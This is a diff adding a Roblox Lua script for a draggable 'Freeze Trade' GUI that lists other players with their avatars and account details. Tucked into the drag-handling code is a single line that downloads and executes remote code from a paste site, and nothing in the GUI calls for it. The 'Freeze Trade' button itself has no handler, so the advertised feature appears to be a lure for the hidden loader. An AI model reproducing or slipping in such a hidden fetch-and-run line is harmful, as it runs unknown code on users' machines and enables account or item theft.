@@ -1,0 +1,260 @@
+-- Freeze Trade GUI - Neon, Draggable, Informative Player Details
+-- Place in StarterPlayerScripts as a LocalScript
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+-- Main GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FreezeTradeUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 240, 0, 280)
+mainFrame.Position = UDim2.new(0.7, 0, 0.3, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+-- Neon Outline
+local outline = Instance.new("UIStroke")
+outline.Color = Color3.fromRGB(0, 255, 170)
+outline.Thickness = 2
+outline.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+outline.Parent = mainFrame
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = mainFrame
+
+-- Dragging System
+local dragging, dragInput, dragStart, startPos
+
+local function updateDrag(input)
+	local delta = input.Position - dragStart
+	mainFrame.Position = UDim2.new(
+		startPos.X.Scale, startPos.X.Offset + delta.X,
+		startPos.Y.Scale, startPos.Y.Offset + delta.Y
+	)
+end
+
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
+mainFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		updateDrag(input)
+	end
+end)
+
+-- Header
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 35)
+header.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+header.BorderSizePixel = 0
+header.Parent = mainFrame
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0, 8)
+headerCorner.Parent = header
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -35, 1, 0)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.Text = "Freeze Trade"
+title.TextColor3 = Color3.fromRGB(0, 255, 170)
+title.TextSize = 16
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
+
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0, 25, 0, 25)
+minimizeButton.Position = UDim2.new(1, -30, 0.5, -12)
+minimizeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
+minimizeButton.Text = "-"
+minimizeButton.Font = Enum.Font.GothamBold
+minimizeButton.TextSize = 16
+minimizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+minimizeButton.Parent = header
+
+local minCorner = Instance.new("UICorner")
+minCorner.CornerRadius = UDim.new(1, 0)
+minCorner.Parent = minimizeButton
+
+-- Content container
+local container = Instance.new("Frame")
+container.Size = UDim2.new(1, -10, 1, -45)
+container.Position = UDim2.new(0, 5, 0, 40)
+container.BackgroundTransparency = 1
+container.Parent = mainFrame
+
+-- Scrollable Player List
+local playerList = Instance.new("ScrollingFrame")
+playerList.Size = UDim2.new(1, 0, 1, 0)
+playerList.CanvasSize = UDim2.new(0, 0, 0, 0)
+playerList.ScrollBarThickness = 4
+playerList.BackgroundTransparency = 1
+playerList.Parent = container
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Parent = playerList
+listLayout.Padding = UDim.new(0, 5)
+
+-- Player Detail View
+local detailView = Instance.new("Frame")
+detailView.Size = UDim2.new(1, 0, 1, 0)
+detailView.BackgroundTransparency = 1
+detailView.Visible = false
+detailView.Parent = container
+
+local detailAvatar = Instance.new("ImageLabel")
+detailAvatar.Size = UDim2.new(0, 90, 0, 90)
+detailAvatar.Position = UDim2.new(0.5, -45, 0, 10)
+detailAvatar.BackgroundTransparency = 1
+detailAvatar.Parent = detailView
+
+local freezeButton = Instance.new("TextButton")
+freezeButton.Size = UDim2.new(0, 150, 0, 35)
+freezeButton.Position = UDim2.new(0.5, -75, 0, 210)
+freezeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
+freezeButton.Text = "Freeze Trade"
+freezeButton.Font = Enum.Font.GothamBold
+freezeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+freezeButton.TextSize = 14
+freezeButton.Parent = detailView
+
+local fbCorner = Instance.new("UICorner")
+fbCorner.CornerRadius = UDim.new(1, 0)
+fbCorner.Parent = freezeButton
+
+local backButton = Instance.new("TextButton")
+backButton.Size = UDim2.new(0, 80, 0, 25)
+backButton.Position = UDim2.new(0, 5, 0, 5)
+backButton.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
+backButton.Text = "Back"
+backButton.Font = Enum.Font.GothamBold
+backButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+backButton.TextSize = 12
+backButton.Parent = detailView
+
+local backCorner = Instance.new("UICorner")
+backCorner.CornerRadius = UDim.new(1, 0)
+backCorner.Parent = backButton
+
+-- Info Labels
+local infoLabels = {}
+local infoY = 110
+for i = 1, 5 do
+	local lbl = Instance.new("TextLabel")
+	lbl.Size = UDim2.new(1, -10, 0, 18)
+	lbl.Position = UDim2.new(0, 5, 0, infoY)
+	lbl.BackgroundTransparency = 1
+	lbl.Font = Enum.Font.Gotham
+	lbl.TextColor3 = Color3.fromRGB(0, 255, 170)
+	lbl.TextSize = 12
+	lbl.TextXAlignment = Enum.TextXAlignment.Left
+	lbl.Parent = detailView
+	infoLabels[i] = lbl
+	infoY = infoY + 20
+end
+
+-- Populate Player List
+local function createPlayerItem(player)
+	if player == LocalPlayer then return end -- skip yourself
+
+	local item = Instance.new("TextButton")
+	item.Size = UDim2.new(1, 0, 0, 40)
+	item.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	item.Text = ""
+	item.Parent = playerList
+
+	local stroke = Instance.new("UIStroke")
+	stroke.Color = Color3.fromRGB(0, 255, 170)
+	stroke.Thickness = 1
+	stroke.Parent = item
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 6)
+	corner.Parent = item
+
+	local avatar = Instance.new("ImageLabel")
+	avatar.Size = UDim2.new(0, 30, 0, 30)
+	avatar.Position = UDim2.new(0, 5, 0.5, -15)
+	avatar.BackgroundTransparency = 1
+	avatar.Parent = item
+
+	local thumb, _ = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+	avatar.Image = thumb
+
+	local nameLabel = Instance.new("TextLabel")
+	nameLabel.Size = UDim2.new(1, -40, 1, 0)
+	nameLabel.Position = UDim2.new(0, 40, 0, 0)
+	nameLabel.BackgroundTransparency = 1
+	nameLabel.Font = Enum.Font.Gotham
+	nameLabel.Text = player.Name
+	nameLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
+	nameLabel.TextSize = 13
+	nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+	nameLabel.Parent = item
+
+	item.MouseButton1Click:Connect(function()
+		playerList.Visible = false
+		detailView.Visible = true
+		local url, _ = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size180x180)
+		detailAvatar.Image = url
+
+		-- Fill in information
+		infoLabels[1].Text = "Username: " .. player.Name
+		infoLabels[2].Text = "Display Name: " .. player.DisplayName
+		infoLabels[3].Text = "User ID: " .. player.UserId
+		infoLabels[4].Text = "Account Age: " .. player.AccountAge .. " days"
+		infoLabels[5].Text = "Team: " .. (player.Team and player.Team.Name or "None")
+	end)
+
+	playerList.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y)
+end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+	createPlayerItem(plr)
+end
+Players.PlayerAdded:Connect(createPlayerItem)
+
+-- Back button
+backButton.MouseButton1Click:Connect(function()
+	detailView.Visible = false
+	playerList.Visible = true
+end)
+
+-- Minimize with animation
+local minimized = false
+minimizeButton.MouseButton1Click:Connect(function()
+	minimized = not minimized
+	if minimized then
+		TweenService:Create(mainFrame, TweenInfo.new(0.25), {Size = UDim2.new(0, 240, 0, 35)}):Play()
+	else
+		TweenService:Create(mainFrame, TweenInfo.new(0.25), {Size = UDim2.new(0, 240, 0, 280)}):Play()
+	end
+end)
